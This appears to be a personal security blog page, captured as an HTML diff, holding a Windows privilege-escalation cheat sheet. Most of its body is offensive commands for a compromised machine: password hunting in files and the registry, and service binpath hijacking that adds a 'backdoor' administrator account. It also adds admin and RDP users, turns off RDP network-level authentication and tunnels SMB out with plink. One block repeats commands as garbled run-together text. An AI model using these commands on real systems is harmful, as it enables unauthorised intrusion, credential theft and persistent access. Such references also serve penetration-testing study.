@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Host Info1234567versysteminfosysteminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;tasklist &#x2F;vc:\windows\system32\license.rtfc:\windows\system32\eula.txtwmic os get Caption, CSDVersi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows-Privilege-Escalation-Cheat-Sheet">
+<meta property="og:url" content="http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/index.html">
+<meta property="og:site_name" content="LØNE&#39;s Blog">
+<meta property="og:description" content="Host Info1234567versysteminfosysteminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;tasklist &#x2F;vc:\windows\system32\license.rtfc:\windows\system32\eula.txtwmic os get Caption, CSDVersi">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-08T09:38:31.000Z">
+<meta property="article:modified_time" content="2022-07-08T09:51:52.811Z">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/takeda_favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/t-apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Windows-Privilege-Escalation-Cheat-Sheet</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/kagehayashi">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/tools/">Tools</a></li><!--
+     --><!--
+       --><li><a href="/cheatsheets/">Cheat Sheets</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/08/Powershell-Tricks/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/27/POP3-Cheat-Sheet/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&text=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&is_video=false&description=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows-Privilege-Escalation-Cheat-Sheet&body=Check out this article: http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&name=Windows-Privilege-Escalation-Cheat-Sheet&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&t=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Info"><span class="toc-number">1.</span> <span class="toc-text">Host Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Info"><span class="toc-number">2.</span> <span class="toc-text">User Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Info"><span class="toc-number">3.</span> <span class="toc-text">Environment Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Info"><span class="toc-number">4.</span> <span class="toc-text">Domain Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Info"><span class="toc-number">5.</span> <span class="toc-text">Network Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">6.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Enumeration"><span class="toc-number">7.</span> <span class="toc-text">Password Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-number">8.</span> <span class="toc-text">Scheduled Tasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-Levels-KE"><span class="toc-number">9.</span> <span class="toc-text">Patch Levels (KE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writable-Files"><span class="toc-number">10.</span> <span class="toc-text">Writable Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-number">11.</span> <span class="toc-text">Unquoted Service Paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Service-Permissions"><span class="toc-number">12.</span> <span class="toc-text">Weak Service Permissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">13.</span> <span class="toc-text">Post Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extra"><span class="toc-number">14.</span> <span class="toc-text">Extra</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Windows-Privilege-Escalation-Cheat-Sheet
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-08T09:38:31.000Z" itemprop="datePublished">2022-07-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Host-Info"><a href="#Host-Info" class="headerlink" title="Host Info"></a>Host Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">tasklist /v</span><br><span class="line">c:\windows\system32\license.rtf</span><br><span class="line">c:\windows\system32\eula.txt</span><br><span class="line">wmic os get Caption, CSDVersion /value</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Info"><a href="#User-Info" class="headerlink" title="User Info"></a>User Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">echo %username%</span><br><span class="line">net user</span><br><span class="line">net user (username)</span><br><span class="line">echo %userprofile%</span><br><span class="line">net localgroup</span><br><span class="line">net config Workstation | find &quot;User name&quot;</span><br><span class="line">query user</span><br><span class="line">wmic useraccount get name</span><br><span class="line">wmic /node: &quot;127.0.0.1&quot; computersystem get username</span><br><span class="line">qwinsta</span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<h2 id="Environment-Info"><a href="#Environment-Info" class="headerlink" title="Environment Info"></a>Environment Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">net</span><br></pre></td></tr></table></figure>
+
+<h2 id="Domain-Info"><a href="#Domain-Info" class="headerlink" title="Domain Info"></a>Domain Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">net view /domain:THINC</span><br><span class="line">net localgroup “Administrators”</span><br><span class="line">net group &quot;Domain Admins&quot; /domain </span><br><span class="line">net share </span><br><span class="line">net session | find / &quot;\\&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Network-Info"><a href="#Network-Info" class="headerlink" title="Network Info"></a>Network Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -A</span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">echo %username%</span><br><span class="line">net user</span><br><span class="line">net user (username)</span><br><span class="line">echo %userprofile%</span><br><span class="line">net localgroup</span><br><span class="line">net config Workstation | find &quot;User name&quot;</span><br><span class="line">query user</span><br><span class="line">wmic useraccount get name</span><br><span class="line">wmic /node: &quot;127.0.0.1&quot; computersystem get username</span><br><span class="line">qwinsta</span><br><span class="line">reg.exe query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultUserName</span><br><span class="line">reg.exe query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultPassword</span><br></pre></td></tr></table></figure>
+
+<h2 id="Password-Enumeration"><a href="#Password-Enumeration" class="headerlink" title="Password Enumeration"></a>Password Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">Simple File Search: </span><br><span class="line">dir /s *password*  </span><br><span class="line">findstr /s /n /i /p password *  </span><br><span class="line">findstr /si password *.txt</span><br><span class="line">dir /s *secret*  </span><br><span class="line">findstr /s /n /i /p secret *  </span><br><span class="line">findstr /si secret *.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query</span><br><span class="line">schtasks /query /v /fo LIST</span><br><span class="line">Get-ScheduledTask | Where State -EQ &#x27;Ready&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Patch-Levels-KE"><a href="#Patch-Levels-KE" class="headerlink" title="Patch Levels (KE)"></a>Patch Levels (KE)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">Notes</span><br><span class="line">Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11- 080 (KB2592799)</span><br><span class="line">After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing</span><br><span class="line">Search patches for given patch</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Writable-Files"><a href="#Writable-Files" class="headerlink" title="Writable Files"></a>Writable Files</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dir /a-r-d /s /b</span><br><span class="line"></span><br><span class="line">Notes</span><br><span class="line"></span><br><span class="line">/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we&#x27;re looking for writable files only.</span><br><span class="line"></span><br><span class="line">/s means recurse subdirectories</span><br><span class="line">/b means bare format. Path and filename only.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">List all unquoted service paths (minus built-in Windows services) on our compromised machine:</span><br><span class="line"></span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">Suppose we found:</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</span><br><span class="line"></span><br><span class="line">If you look at the registry entry for this service with Regedit you can see the ImagePath value is:</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</span><br><span class="line"></span><br><span class="line">To be secure it should be like this:</span><br><span class="line"> “C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”</span><br><span class="line">When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:</span><br><span class="line">   C:\Program.exe</span><br><span class="line">   C:\Program Files.exe</span><br><span class="line">   C:\Program Files(x86)\Program Folder\A.exe</span><br><span class="line">       …</span><br><span class="line">Check permissions of folder path</span><br><span class="line">   icacls &quot;C:\Program Files (x86)\Program Folder&quot;</span><br><span class="line"></span><br><span class="line">If we can write in the path we plant a backdoor with the same name with the service and restart the service.</span><br><span class="line"></span><br><span class="line">Metasploit module:</span><br><span class="line"></span><br><span class="line">exploit/windows/local/trusted_service_path</span><br></pre></td></tr></table></figure>
+
+<h2 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</span><br><span class="line"></span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</span><br><span class="line">accesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteula</span><br><span class="line">accesschk.exe -qdws Users C:\Windows\</span><br><span class="line">Then query the service using Windows sc: </span><br><span class="line">sc qc &lt;vulnerable service name&gt;</span><br><span class="line"></span><br><span class="line">Then change the binpath to execute your own commands (restart of the service will most likely be needed): </span><br><span class="line"></span><br><span class="line">sc config &lt;vuln-service&gt; binpath= &quot;net user backdoor backdoor123 /add&quot; </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line">sc config &lt;vuln-service&gt; binpath= &quot;net localgroup Administrators backdoor /add&quot; </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line">Note - Might need to use the depend attribute explicitly: </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc config &lt;vuln-service&gt; binPath= &quot;c:\inetpub\wwwroot\runmsf.exe&quot; depend= &quot;&quot; start= demand obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Metasploit module: </span><br><span class="line">exploit/windows/local/service_permissions</span><br><span class="line">&lt;a href=&quot;https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exeaccesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteulaaccesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteulaaccesschk.exe -qdws Users C:\Windows\Then query the service using Windows sc: sc qc &lt;vulnerable service name&gt;Then change the binpath to execute your own commands (restart of the service will most likely be needed): sc config &lt;vuln-service&gt; binpath= &quot;net user backdoor backdoor123 /add&quot; sc stop &lt;vuln-service&gt;sc start &lt;vuln-service&gt;sc config &lt;vuln-service&gt; binpath= &quot;net localgroup Administrators backdoor /add&quot; sc stop &lt;vuln-service&gt;sc start &lt;vuln-service&gt;Note - Might need to use the depend attribute explicitly: sc stop &lt;vuln-service&gt;sc config &lt;vuln-service&gt; binPath= &quot;c:\inetpub\wwwroot\runmsf.exe&quot; depend= &quot;&quot; start= demand obj= &quot;.\LocalSystem&quot; password= &quot;&quot;sc start </span><br></pre></td></tr></table></figure>
+
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><ul>
+<li><p>Add Users</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup Administrators username /add</span><br><span class="line">net localgroup “Remote Desktop Users” username /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>psexec.exe -accepteula \\10.11.10.167 -u hostname\username -p password cmd /c ipconfig </code></p>
+</li>
+<li><p>RunAs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:hostname\&lt;username&gt; explorer.exe</span><br></pre></td></tr></table></figure></li>
+<li><p>Disable Firewall</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh advfirewall firewall show rule all</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RDP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Enable RDP</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Old RDP ker cred login bullshit</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Local Remote port forward Plink (Use to tunnel out RDP, SMB, etc. etc.)</span><br><span class="line">    plink.exe -l &lt;user&gt; -pw &lt;password&gt; 10.11.0.70 -R 9595:localhost:445</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>AV Evasion</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">veil-evasion</span><br><span class="line">hyperion.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a> </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/kagehayashi">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/tools/">Tools</a></li>
+         
+          <li><a href="/cheatsheets/">Cheat Sheets</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Info"><span class="toc-number">1.</span> <span class="toc-text">Host Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Info"><span class="toc-number">2.</span> <span class="toc-text">User Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Info"><span class="toc-number">3.</span> <span class="toc-text">Environment Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Info"><span class="toc-number">4.</span> <span class="toc-text">Domain Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Info"><span class="toc-number">5.</span> <span class="toc-text">Network Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">6.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Enumeration"><span class="toc-number">7.</span> <span class="toc-text">Password Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-number">8.</span> <span class="toc-text">Scheduled Tasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-Levels-KE"><span class="toc-number">9.</span> <span class="toc-text">Patch Levels (KE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writable-Files"><span class="toc-number">10.</span> <span class="toc-text">Writable Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-number">11.</span> <span class="toc-text">Unquoted Service Paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Service-Permissions"><span class="toc-number">12.</span> <span class="toc-text">Weak Service Permissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">13.</span> <span class="toc-text">Post Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extra"><span class="toc-number">14.</span> <span class="toc-text">Extra</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&text=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&is_video=false&description=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows-Privilege-Escalation-Cheat-Sheet&body=Check out this article: http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
